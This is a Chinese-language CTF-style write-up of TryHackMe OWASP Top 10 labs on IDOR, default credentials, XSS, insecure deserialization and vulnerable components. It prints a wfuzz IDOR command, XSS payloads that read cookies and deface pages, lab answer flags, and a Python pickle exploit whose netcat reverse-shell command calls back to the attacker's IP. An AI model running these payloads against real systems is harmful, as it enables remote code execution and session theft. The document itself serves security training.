_**场景#2**_-攻击者强制浏览目标 URL（访问管理页面通常是需要管理员权限的）。

> http://example.com/app/getappInfo
>
> http://example.com/app/admin\_getappInfo

如果未经身份验证的用户可以访问目标站点的任何一个页面，则说明目标网站存在访问控制缺陷；如果非管理员用户可以访问管理页面，也说明目标网站存在访问控制缺陷。

简而言之，损坏的访问控制&#x5C06;_**允许攻击者绕过授权**_（即：发生越权操作），这可以让他们像特权用户(此处不单指admin用户，而是指相对于普通用户权限更高的用户)一样查看敏感数据或者执行其他操作。

## \[严重程度TOP5] 损坏的访问控制（IDOR 练习）

![image-20221205121133524](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205121133524.png)

IDOR，或者被称为不安全的直接对象引用( Insecure Direct Object Reference)，是一种利用 用户输入处理方式中的错误配置(目标站点方的设置错误)来访问通常无法访问的资源的行为，IDOR 是一种访问控制漏洞。

**例子：**

假设我们正在登录我们的银行账户，在正确通过身份验证之后，我们被导航至一个URL`https://example.com/bank?account_number=1234`，在该URL对应的网站页面上，我们可以看到自己的银行账户详细信息，并能执行一些常规操作。

然而，这里存在一个潜在的问题，在攻击者将 `account_number` 参数更改为 1235 等其他内容之后，如果目标站点存在相关的配置错误，那么攻击者就可以访问其他用户所对应的银行账户详细信息。

**答题**

![image-20221205192842586](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205192842586.png)

启动目标机器，利用已知信息(用户名：noot、密码：test1234)进行用户登录操作：

![image-20221205194722934](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205194722934.png)

![image-20221205194749516](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205194749516.png)

进行IDOR测试，更改浏览器URL栏中的参数值（修改为：?note=0），尝试访问与其他用户相关的资源并获取flag：

tips：使用FUZZ工具（如wfuzz）进行测试--`?note=FUZZ`范围设置为0到100即可。

`wfuzz -c --hh 0 -z range,0-100 http://10.10.224.32/note.php?note=FUZZ`

只有0和1对应的响应码为200。

![image-20221205194844060](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205194844060.png)

> flag为：flag{fivefourthree}

## \[严重程度TOP6] 安全配置错误

**安全配置错误**

安全配置错误与其他OWASP-TOP10漏洞不同，因为它发生在本可以正确配置但未正确配置安全性机制的情况下。

安全配置错误包括：

* 对云服务（如 S3 存储桶）的权限配置不当。
* 启用不必要的功能，例如某些服务、页面、帐户或权限。
* 使用密码未更改的默认帐户。
* 过于详细的错误消息提示，这将使攻击者可以找到有关目标系统的更多信息。
* 不使用[HTTP安全标头](https://owasp.org/www-project-secure-headers/)，或在web服务器中透露太多细节：通过HTTP 标头泄露。

此漏洞通常会导致更多漏洞产生，例如允许攻击者使用默认凭据以访问某些敏感数据、允许攻击者执行 发生在admin页面上的 XXE注入或命令注入。

有关安全配置错误的更多信息，建议查看OWASP相关页面： https://owasp.org/www-project-top-ten/2017/A6\_2017-Security\_Misconfiguration.html

**安全配置错误案例-使用默认密码**

应用程序的所有者可以并且也应该去更改该应用程序所使用的默认密码，但他们经常不会这样做。使用默认密码在嵌入式和物联网(IoT-Internet of Things)设备中尤为常见，大多数时候设备的所有者并不会去更改这些密码。

从攻击者的角度看，攻击方很容易尝试利用默认凭据来执行一些本不应该被允许的操作，他们能够访问管理员仪表面板、访问为系统管理员或制造商而设计的某些服务，甚至能够访问网络基础设施--这在针对企业进行攻击时可能非常有用。管理员使用默认凭证的负面影响可能很严重，从敏感信息泄露到 RCE攻击 都有可能发生。

2016 年 10 月，Dyn（一家 DNS 提供商）因过去 10 年最令人难忘的 DDoS 攻击之一而下线，大量恶意流量主要来自物联网设备和网络设备，如路由器、调制解调器，它们在这次DDoS 攻击中被 Mirai 恶意软件感染。

恶意软件是如何接管系统的？ 答案是通过利用默认密码，该恶意软件有一个包含 63 个用户名/密码对的列表，并以此试图登录已经暴露的 telnet 服务。

这次 DDoS 攻击引人注目，因为它使许多大型网站和服务脱机。 Amazon、Twitter、Netflix、GitHub、Xbox Live、PlayStation Network 和更多服务在这场针对 Dyn 的 3 波 DDoS 攻击中被波及以致于离线数小时。

**答题**

![image-20221205200748825](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205200748825.png)

启动目标机器，访问目标站点：

![image-20221205205103801](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205205103801.png)

尝试使用以下方法：

```
1. 通过修改URL，查看目标站点的readme.txt文件
2. 通过修改URL，查看目标站点可能存在的页面--http[s]://url/docs
3. 通过修改URL，查看目标站点可能存在的页面--http[s]://url/documentation
4. 通过修改URL，查看目标站点的changelog.txt文件
5. 通过修改URL，查看目标站点的README.md文件
6. 查看页面源代码中的注释内容、查看页面源代码中的js文件内容......
7. 利用网页中的关键字，在GitHub上面搜索相关的存储库，找到存储库之后查看README.md文件内容。
8. 使用dirbuster/gobuster进行网站目录爆破 
```

最后，我们可以在GitHub中找到目标站点相关的项目（搜索关键&#x8BCD;_**Pensive Notes**_）：

![image-20221205211241697](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205211241697.png)

在相关项目的README.md文档中找到默认登录凭据：

![image-20221205211409131](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205211409131.png)

> pensive:PensiveNotes

使用刚才发现的默认凭据进行网站登录并获取flag：

![image-20221205211541267](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205211541267.png)

![image-20221205211630960](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205211630960.png)

> flag为：thm{4b9513968fd564a87b28aa1f9d672e17}

## \[严重程度TOP7] 跨站脚本（XSS漏洞）

**XSS 概念解释**

跨站点脚本，也被称为 XSS，是一种经常能够在 Web 应用程序中被发现的安全漏洞。XSS是一种注入漏洞，攻击者可以构造恶意脚本并能够让该脚本在受害者的机器上被成功执行。

如果 Web 应用程序使用未经过滤的“用户输入”，则该应用程序很容易受到 XSS 攻击。 XSS在 Javascript、VBScript、Flash 和 CSS 中都是可能发生的，跨站点脚本主要分为三种类型：

1. 存储型 XSS - 最危险的 XSS 类型，往往是网站数据库中的恶意字符串的来源；如果网站允许“用户输入”在插入到数据库时未经&#x8FC7;_**清理**_（删除用户输入的“恶意部分”），则通常会发生这种类型的XSS。
2. 反射型 XSS - 如果XSS Payload是受害者对网站请求的一部分，那么该网站则会包含此payload然后响应用户的请求；总而言之，攻击者需要诱骗受害者点击一个 URL链接来执行攻击者所构造的XSS Payload。
3. 基于 DOM 的 XSS - DOM 指文档对象模型，它是 HTML 和 XML 文档的编程接口，它能代表网站页面，以便程序对文档结构、样式和内容进行更改。你可以将网页理解为一个文档，这个文档可以显示在浏览器窗口中或者作为 HTML 源文件显示。

如需更多关于 XSS 的解释和练习，请查看XSS相关笔记。

**XSS Payloads**

跨站点脚本是一个漏洞，我们可以利用它在受害者的机器上执行恶意 Javascript，请查看一些常用的XSS Payload类型：

* 弹消息框 (`<script>alert(“Hello World”)</script>`) ：在目标用户的浏览器上创建一个 Hello World 消息弹出窗口。
* 覆盖 HTML (`document.write`)：覆盖网站的 HTML 以添加攻击者所输入的内容（基本上破坏了 正常用户对完整页面的阅读体验）。
* 键盘记录器-XSS Keylogger ( http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html ) ：可用于记录用户的键盘敲击情况，以捕获目标用户在网站页面上所输入的密码信息和其他敏感信息。
* 端口扫描器-Port scanning ( http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html ) ：一个mini的本地端口扫描器。

XSS-Payloads.com ( http://www.xss-payloads.com/ ) 是一个存储与 XSS 相关的Payload、工具、文档等内容的网站。 你可以在该网站下载XSS Payload，这些XSS Payload能实现 通过网络摄像头拍摄快照，或者实现一些端口扫描器和网络扫描器的相关功能。

**答题**

![image-20221205223354015](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205223354015.png)

已知提示信息：

* 提示1.在 Javascript `window.location.hostname` 中将显示当前主机名，你部署的机器的主机名将是其 IP 地址。
* 提示2.`<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`。

启动目标机器，访问目标站点，完成注册并进行登录：

![image-20221205230328062](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205230328062.png) ![image-20221205230434516](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205230434516.png)

导航至http://Machine\_IP/reflected页面，使用以下XSS Payload（这将弹窗并显示一些文本内容），成功执行Payload之后会得到Answer：

```javascript
<script>alert(“Hello”)</script>
```

![image-20221205230649858](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205230649858.png) ![image-20221205230552515](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205230552515.png)

> ThereIsMoreToXSSThanYouThink

继续使用/reflected页面，输入以下XSS Payload（这将弹窗并显示hostname，此处为ip地址），成功执行Payload之后会得到一个Answer：

```javascript
<script>alert(window.location.hostname)</script>
```

![image-20221205230729646](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205230729646.png)

![image-20221205230748169](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205230748169.png)

![image-20221205230807046](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205230807046.png)

> ReflectiveXss4TheWin

导航至http://Machine\_IP/stored页面，使用以下XSS Payload（这将插入HTML内容），成功执行Payload之后会得到一个Answer：

```html
<p>Hi my name is Hekeats</p>
```

![image-20221205230910716](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205230910716.png) ![image-20221205231009442](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205231009442.png)

> HTML\_T4gs

继续使用/stored页面，输入以下XSS Payload（这将弹窗并显示cookie值），成功执行Payload之后会得到一个Answer：

```javascript
<script>alert(document.cookie)</script>
```

![image-20221205231235282](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205231235282.png) ![image-20221205231306286](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205231306286.png) ![image-20221205231321702](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205231321702.png)

> W3LL\_D0N3\_LVL2

继续使用/stored页面，输入以下XSS Payload（这将更改HTML页面值），成功执行Payload之后会得到一个Answer，如果没有显示 请自行刷新页面：

```javascript
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
```

![image-20221205231513004](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205231513004.png) ![image-20221205231829102](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205231829102.png)

> websites\_can\_be\_easily\_defaced\_with\_xss

## \[严重程度TOP8] 不安全的反序列化（反序列化漏洞）

“不安全的反序列化是一种漏洞，当不受信任的数据被用于滥用应用程序的逻辑时就会发生这种情况”（Acunetix，2017 年）

这个定义还是很宽泛的，简而言之，不安全的反序列化就是用恶意代码替换应用程序将要处理的数据；这将允许发生 DoS（拒绝服务）攻击、RCE（远程代码执行）攻击等一系列的攻击行为，攻击者可以利用不安全的反序列化在渗透测试场景中获得立足点。

具体而言，在不安全的反序列中，恶意代码实际上是利用了 Web 应用程序所使用的合法序列化、反序列化过程；我们稍后将解释这个合法过程以及为什么它在现代 Web 应用程序中如此普遍。

OWASP 将此漏洞评为10位中的第8位(严重程度较低) ，原因如下：

* 低可利用性。 此漏洞通常视具体情况而定——没有可靠的工具/框架，由于该漏洞性质，攻击者需要很好地了解 ToE 的内部工作原理。
* 此类漏洞利用仅在攻击者的技能允许时才危险，通常需要关注的问题是：因为该漏洞而暴露的数据的价值。通过反序列化漏洞发起 DoS 攻击的攻击者会使目标应用程序不可用，而DoS攻击对基础设施的业务影响会有所不同——一些组织可能会恢复得很好，而其他组织则可能不会。

**什么目标是易受(反序列化漏洞)攻击的？**

在没有对查询或保留的数据进行验证、完整性检查的情况下就存储或获取数据的任何应用程序，都将被视为易受反序列化漏洞影响；有关这种性质的应用程序的几个例子是：

* 电子商务网站
* 论坛
* API's--应用程序编程接口
* [应用程序运行时](https://cloud.tencent.com/developer/article/1881588)--Application Runtimes（Tomcat、Jenkins、Jboss 等）

**答题**

![image-20221205234852246](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205234852246.png)

tips：DoS攻击--Denial of Service

## \[严重程度TOP8] 不安全的反序列化-对象

作为面向对象编程 (OOP：object-oriented programming) 的一个重要元素，对象主要由两部分组成：

* 状态
* 行为

简单地说，对象允许你创建相似的代码行，而无需再次编写相同的代码行。

例如，一盏灯将是一个很好的对象，灯可以有 不同类型的灯泡 ，这是它的状态，而灯的 开/关 则是它的行为！你不必考虑每种类型的灯泡以及该特定灯是否打开或关闭，因为你可以使用方法(methods)来简单地改变灯的状态和行为。

**答题**

![image-20221206235215817](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221206235215817.png)

## \[严重程度TOP8] 不安全的反序列化-反序列化

**序列化和反序列化**

通过类比来学习：一位外国游客在街上向你走来并问路，他正在寻找当地的地标，但他迷路了，不幸的是，中文不是他的强项，而你也不会说他的语言。你会怎么做呢？你可以画一张通往地标的路线图，因为图片跨越了语言障碍，这能够让他成功找到地标。 好的！你刚刚其实就是对一些信息进行了序列化，然后这位迷路的游客则对已被处理的信息进行了反序列化 从而最终找到地标。

简而言之：序列化是将编程中使用的对象转换为更简单、兼容的格式，以便在系统或网络之间传输以进行进一步处理或存储的过程；而反序列化则相反，反序列化能够将序列化信息转换成它们原本的复杂形式——重新变为一个应用程序可以理解的对象。

_**例：**_

假设有一个密码字符串“password123”，它来自一个程序，现在我们需要将该密码字符串存储到另一个系统上的数据库中；这是一个在网络中传输数据的过程，因而我们需要将此字符串/输出转换为二进制形式（这是一个序列化过程）以便在网络中进行数据传输。

当然，这个密码最终还是要在目标系统中被存储为“password123”字符串形式而不是其二进制形式；所以，一旦需要被存储的数据到达了目标系统的数据库中，它就需要被转换或反序列化回“password123”字符串（这是一个反序列化过程），以便目标数据库进行存储。

![image-20221207080331427](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207080331427.png)

**如何利用序列化和反序列化？**

简而言之，当来自不受信任方（即攻击方）的数据没有经过过滤处理或输入验证处理而 被系统执行时，就可能会发生不安全的反序列化；在这种情况下：系统会假定用户所输入的数据是可信的，并且会毫无保留地执行相关的数据内容，从而导致一系列安全风险的产生。

**答题**

![image-20221207081346257](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207081346257.png)

## \[严重程度TOP8] 不安全的反序列化-Cookies

**Cookies 简介**

![image-20221207081523717](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207081523717.png)

Cookies 是现代网站运行的重要工具之一，是由网站创建并存储在用户的计算机上的微小的数据段。

![image-20221207081911048](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207081911048.png)

你会在大多数网站上看到类似上图的通知信息，网站将使用 cookies 来存储特定于用户的行为，例如用户购物车中的商品或会话 ID；在 Web 应用程序中，我们将利用它，你会注意到 cookie 将存储如下登录信息。

![image-20221207083619301](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207083619301.png)

虽然使用明文凭据本身就是一种漏洞，但它并不属于不安全的反序列化，因为在使用明文凭据时，我们并未发送任何要执行的序列化数据！

Cookie 不是一个像数据库那样的永久存储解决方案，一些 cookie（例如会话 ID）会在浏览器关闭时被清除，而其他 cookie 则可能会持续相当长的时间；cookie的具体有效时间是由创建 cookie 时所设置的“到期(Expiry)”计时器来决定的。

一些 cookie 有额外的属性，下面是相关的介绍：

![image-20221207084956109](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207084956109.png)

**创建 Cookie**

可以使用各种网站编程语言设置 Cookie，例如Javascript、PHP 或 Python 等等；下面的Web应用是使用Python的Flask开发的，拿它来举例比较合适。

![image-20221207090734279](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207090734279.png)

在 Flask 中设置 cookie 相当简单，上图中的代码片段会获取当前日期和时间，并将其存储在变量“timestamp”中，然后将日期和时间存储在名为“registrationTimestamp”的 cookie 中，它在浏览器中的样子为：

![image-20221207093801602](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207093801602.png)

**答题**

![image-20221207093837451](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207093837451.png)

## \[严重程度TOP8] 不安全的反序列化-基于Cookies的练习

**访问练习实例**

使用已经连接到TryHackMe VPN 的攻击机，通过浏览器导航到 http://MACHINE\_IP ，此处将详细介绍使用Firefox浏览器的练习步骤--你可能需要研究如何在其他浏览器中检查 cookie。 访问目标站点之后，你将看到如下主页界面：

![image-20221207094203679](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207094203679.png)

让我们创建一个帐户，你可以输入你所喜欢的任何内容。

![image-20221207094233129](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207094233129.png)

完成登录行为之后，你将被重定向到个人资料页面，在此页面右侧，你可以看到你的个人详细信息。

![image-20221207094417615](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207094417615.png)

右键单击以上页面，然后选择“检查元素-Inspect Element”，导航到“存储-Storage”选项卡。

![image-20221207094605184](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207094605184.png)

**检查已编码的数据**

你会发现，这些 cookie 既有明文显示的，也有经过 base64 编码的，第一个flag将在其中一个 cookie 中找到。

**修改 Cookie 值**

请注意，你现在有一个名为“userType”的 cookie，正如你在“myprofile-我的个人资料”页面上的信息所确认的那样，你目前的身份是一名普通用户-user。

此web应用程序会根据你的账户类型来确定你可以看到和不能看到的内容，如果你现在想成为管理员身份该怎么办？你可以尝试修改cookie值！

左键双击“userType”的“Value”栏，修改内容，让我们将userType的Value更改为“admin”然后导航到 http://MACHINE\_IP/admin 以获得第二个flag。

**答题**

![image-20221207095944461](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207095944461.png)

启动目标机器，在攻击机的浏览器中访问目标站点并注册账户以完成登录操作：

![image-20221207151136620](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207151136620.png)

![image-20221207151215577](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207151215577.png)

成功登录后，将进入到个人资料界面，右键单击此页面，选择“检查元素-Inspect Element”并导航到“存储-Storage”选项卡，获得第一个flag：

![image-20221207151232692](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207151232692.png)

![image-20221207151446303](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207151446303.png)

![image-20221207151648417](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207151648417.png)

> base64解码网站：https://www.base64decode.org/
>
> flag：THM{good\_old\_base64\_huh}

左键双击“userType”的“Value”栏，将Value更改为“admin”然后导航到 http://MACHINE\_IP/admin 并获得第二个flag：

![image-20221207151730728](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207151730728.png)

![image-20221207151819237](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207151819237.png)

> THM{heres\_the\_admin\_flag}

## \[严重程度TOP8] 不安全的反序列化-代码执行

这是一种比简单地解码 cookie 更加邪恶的攻击，我们将深入了解它的本质。

**继续使用上节中的示例进行设置**

1、先将cookie中的userType的值从“admin”重新改为“user”，返回http://MACHINE\_IP/myprofile 页面。

2.然后，左键单击下面截图中“Exhange your vim”上的 URL链接。（此处的vim指：Vertical Improved Mail--垂直改进邮件）

![image-20221207152555143](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207152555143.png)

3.完成上述操作后，左键单击上图中的“Provide your feedback!--提供您的反馈！”上的 URL链接，你将直接转到下图的页面：

![image-20221207152722157](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221207152722157.png)

**怎样利用以上设置？**

如果用户在表单中输入了他们的反馈信息，则相关数据可能会经过编码处理并发送到 Flask 应用程序（这些数据可能会被存储到数据库中）；但是，发生以上过程的前提条件是：目标应用程序会假定任何已编码的数据都是可信的（此条件在现实环境下可能并不能满足）。

了解下面代码片段中发生的事情很重要：

![image-20221207153718508](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207153718508.png)

当你访问“Exchange your vim”URL链接时，一个 cookie 将被编码处理并存储在你的浏览器中 - 我们可以尝试修改！而一旦你访问反馈表单，前述经过编码处理的 cookie 值就会被解码并执行反序列化过程。 在下面的代码片段中，我们可以看到cookie是如何被检索的，并最终通过 `pickle.loads` 完成反序列化过程。

![image-20221207154218107](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207154218107.png)

此漏洞利用了Python中的`Pickle`，我们可以借此机制尝试建立一个反向 shell。

**漏洞利用**

1.首先，我们需要在攻击机上设置一个 netcat 监听器。

![image-20221207154725552](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207154725552.png)

因为被反序列化的代码来自于 base64 格式的cookie内容，所以我们不能简单地生成一个反向 shell，我们必须使用 base64 对我们需要执行的命令进行编码处理，以便最终能够执行恶意代码。

2.完成监听器的设置后，将 python 文件 ([pickelme.py](https://assets.tryhackme.com/additional/cmn-owasptopten/pickleme.py)) 中的源代码复制并粘贴到你的攻击机上，修改源代码将“YOUR\_TRYHACKME\_VPN\_IP”替换为你的攻击机所使用的 TryHackMe VPN IP。

![image-20221207155331116](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207155331116.png)

3.通过 python3执行“ pickelme.py”并查看命令的输出结果（下图命令中的rce.py即是修改内容之后的pickelme.py）：

![image-20221207155919908](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207155919908.png)

4.复制并粘贴以上输出结果中的 两个单引号标记（'DATA'）之间的所有内容：

![image-20221207160302850](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207160302850.png)

5.将其粘贴到浏览器中的“encodedPayload”cookie值中：

![image-20221207160531109](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207160531109.png)

6.确保我们的攻击机上的 netcat 侦听器仍在运行：

![image-20221207160616402](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207160616402.png)

7.在个人资料页面 点击提交反馈对应的URL链接(这将触发对cookie值进行反序列化的过程)，在攻击机上将接收到一个反向shell，我们可以通过这个shell界面查看flag.txt文件内容：

![image-20221207160723115](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207160723115.png)

**答题**

![image-20221207160901060](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207160901060.png)

实际操作步骤和本节内容所介绍的基本一致：

修改userType值为user

![image-20221207161146842](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207161146842.png)

回到个人资料页面 http://MACHINE\_IP/myprofile ，点&#x51FB;_&#x45;xchange your vi&#x6D;_&#x94FE;接（此处的vim指：Vertical Improved Mail--垂直改进邮件）

![image-20221207161312676](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207161312676.png)

点击链接之后，我们可以看到cookie发生了变化

![image-20221207162549336](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207162549336.png)

现在可以开始反序列化漏洞利用过程：主要操作是构建一段经过base64编码处理的恶意代码，用恶意代码替换上图中的指定cookie值--即encodedPayload的值；我们使用以下py脚本来生成一段可以用于建立反向shell的base64格式的payload：

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

修改ip地址为攻击机ip地址(此处ip地址为tun0网卡对应地址)

![image-20221207163535284](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207163535284.png)

在攻击机上设置Netcat监听器：

![image-20221207164140555](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207164140555.png)

执行脚本，获得payload(取单引号中的内容作为payload)并填充至指定的cookie值中--即encodedPayload的对应值：

![image-20221207163952013](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207163952013.png)

![image-20221207164207319](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207164207319.png)

在个人资料页面 点击提交反馈对应的URL链接，这将触发对之前所修改的指定cookie值的反序列化过程：

![image-20221207164305760](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207164305760.png)

回到攻击机终端界面，获得一个反向shell，使用该shell界面查找flag.txt文件，并查看其内容：

![image-20221207164914268](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221207164914268.png)

> 4a69a7ff9fd68

## \[严重程度TOP9] 具有已知漏洞的组件-简介

有时，你可能会发现你正在进行渗透测试的公司所使用的应用程序本身就存在有充分记录的已知漏洞。

例如，假设现在有一家公司已经有几年没有更新他们的 WordPress 版本，通过使用诸如 wpscan 之类的工具进行扫描，你发现了它是 4.6 版本的WordPress，经过调查你会发现 WordPress 4.6 版本容易受到未经身份验证的远程代码执行 (RCE) 攻击，也许你还可以在漏洞利用数据库**exploit-db**中找到[相关的漏洞exp](https://www.exploit-db.com/exploits/41962)。

正如你所看到的，这将是一件非常具有破坏性的事情，在这种情况下攻击者只需要做很少的工作就能完成攻击，因为目标应用程序的相关漏洞可能已经众所周知，其他攻击者也已经利用过了相关漏洞，所以，如果一家公司错过了他们所使用的应用程序的一次版本更新或者补丁更新，那么他们就可能遭受一些来自不法份子的网络攻击。

OWASP组织将 具有已知漏洞的组件 评级为流行等级3（意思是有较高的流行度），因为在现实情况下，目标公司往往很容易错过对目标应用程序的及时更新。

## \[严重程度TOP9] 具有已知漏洞的组件-漏洞利用

因为目标应用程序存在已知漏洞的组件，所以大部分攻击工作已经为我们完成了。我们的主要工作是找出目标软件的信息，并对其进行研究，直到找到相关的已知漏洞详情。

接下来，让我们通过一个Web 应用程序示例来了解一下。

![image-20221207171014001](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207171014001.png)

假设目标正在使用web服务器-nostromo 的默认页面，那么现在我们知道了目标应用程序的版本号和相关的软件名称，我们可以使用 [exploit-db](https://www.exploit-db.com/) 来尝试找到这个特定版本的nostromo 漏洞。（注意：exploit-db 非常有用，对于网络安全初学者来说，你可能会经常使用它，所以最好熟悉它）

![image-20221207171639350](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207171639350.png)

如上图所示，我们找到了一个相关的漏洞利用脚本，让我们下载它并尝试执行代码，然而单独运行这个脚本的结果并未如我们所愿，它会给出如下图所示的报错信息。

![image-20221207171908610](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207171908610.png)

